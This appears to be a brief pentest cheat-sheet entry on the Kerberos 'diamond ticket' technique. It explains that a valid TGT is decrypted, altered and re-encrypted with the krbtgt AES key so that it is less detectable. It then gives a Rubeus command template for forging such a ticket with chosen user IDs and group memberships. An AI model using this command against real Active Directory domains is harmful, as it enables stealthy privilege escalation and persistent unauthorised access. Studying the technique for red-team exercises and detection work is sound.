# Diamond Ticket

A diamond ticket is created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account which makes it less detectable.

## Modify The Ticket

{% code overflow="wrap" %}
```powershell
Rubeus.exe diamond
/domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
```
{% endcode %}
